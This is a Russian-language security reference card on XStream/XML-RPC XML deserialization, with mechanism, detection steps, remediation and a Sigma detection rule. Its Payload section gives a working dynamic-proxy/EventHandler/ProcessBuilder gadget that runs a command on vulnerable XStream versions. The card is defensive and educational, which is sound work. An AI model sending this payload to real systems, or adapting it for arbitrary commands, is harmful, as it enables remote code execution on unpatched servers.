---
id: deserialization-xstream-xml
title: "XStream/XML-RPC: десериализация XML в объекты"
type: deserialization
target: xml
category: web
difficulty: advanced
bypass: none
tags: [deserialization, xml, xstream, xmlrpc]
tested_on: ["XStream < 1.4.18", "Apache XML-RPC", "SOAP-сервисы"]
success_rate: 0.35
risk: critical
cwe: "CWE-502"
lab: null
last_verified: "2026-10-23"
references:
  - "https://x-stream.github.io/security.html"
graph:
  - target: "deserialization"
    type: instance_of
  - target: "xxe"
    type: related_to
  - target: "rce"
    type: leads_to
---

# XStream/XML-RPC: десериализация XML в объекты

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<map>
  <entry>
    <string>hb</string>
    <dynamic-proxy>
      <interface>java.lang.Comparable</interface>
      <handler class="java.beans.EventHandler">
        <target class="java.lang.ProcessBuilder">
          <command><string>id</string></command>
        </target>
        <action>start</action>
      </handler>
    </dynamic-proxy>
  </entry>
</map>
```

## Explanation

XStream превращает XML в граф объектов Java и исторически не ограничивал
типы: конструкция `dynamic-proxy` + `EventHandler` вызывает метод
произвольного объекта (в примере — `ProcessBuilder.start`). Это не XXE
(внешние сущности не нужны), а именно десериализация: XML выступает
переносчиком объекта.

Похожие точки входа: Apache XML-RPC (`SerializingConverter`), SOAP-сообщения
с `xsi:type`, Hessian/Burlap бинарные протоколы, Kryo/FST в кеш-слоях,
BPM-движки (Camunda/Activiti), сериализованные правила в Drools.

В CVE-бюллетенях XStream более 30 записей RCE — библиотека обновляется,
но безопасной становится только с явным security framework (whitelist типов).

Готовые цепочки эксплуатации (ysoserial-гаджеты, шеллкод, обфускация) в проекте
не публикуются: карточка описывает **механизм**, признаки и способы защиты.
Для практики используйте лабораторию с известным уязвимым приложением и
публичный инструментарий в изолированной сети.

## Detection

1. Найдите XML-эндпоинты, принимающие граф объектов (`<map>`, `<linked-hash-map>`,
   `<dynamic-proxy>`, атрибуты `class=`).
2. Отправьте документ с неизвестным классом: ошибка `CannotResolveClassException`
   подтверждает XStream.
3. Безопасная проба: класс, делающий DNS-запрос на collaborator.
4. Инвентаризация: XStream < 1.4.18, наличие `setupDefaultSecurity` (устарел),
   XML-RPC-сервисы в стеке.
5. В логах: стектрейсы `com.thoughtworks.xstream`, `EventHandler`,
   `ProcessBuilder`.

## Remediation

- XStream: `xstream.addPermission(NoTypePermission.NONE)` + явный whitelist
  нужных типов (`allowTypes(new Class[]{…})`), версия ≥ 1.4.20.
- Не использовать XML для переноса объектов; перейти на JSON со схемой
  или protobuf/Avro.
- Отключить XML-RPC, если не требуется; изолировать SOAP-эндпоинты и
  валидировать WSDL-схемой.
- Egress-фильтрация (блокирует JNDI/DNS-callback цепочки).
- SCA/SAST в CI, регулярные обновления зависимостей.
- Мониторинг: появление `dynamic-proxy`/`EventHandler` в входящем XML.

## Detection rules

```yaml
title: XStream-гаджеты — dynamic-proxy и опасные классы в входящем XML
id: e5f6a7b8-0116-4e5f-9a7b-000000000116
status: experimental
description: >-
  Входящий XML содержит конструкции XStream-гаджетов: <dynamic-proxy>,
  <sorted-set> с Comparable-хендлером, EventHandler/ProcessBuilder. XStream
  до 1.4.18 десериализует их в RCE.
references:
  - https://attack.mitre.org/techniques/T1190/
  - https://x-stream.github.io/CVE-2021-39144.html
logsource:
  category: application
  definition: 'логи приложения/WAF с телом XML-запроса'
detection:
  selection_body:
    request_body|contains:
      - '<dynamic-proxy>'
      - '<sorted-set>'
      - 'java.beans.EventHandler'
      - 'XStreamException'
      - '<interface>java.lang.Comparable'
  selection_error:
    error_message|contains:
      - 'XStreamException'
      - 'xstream'
  condition: selection_body or selection_error
fields:
  - source_ip
  - request_path
  - request_body
  - error_message
falsepositives:
  - внутренние интеграции, легитимно использующие XStream (фиксируйте список
    эндпоинтов и обновите XStream до 1.4.20+)
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.502
```
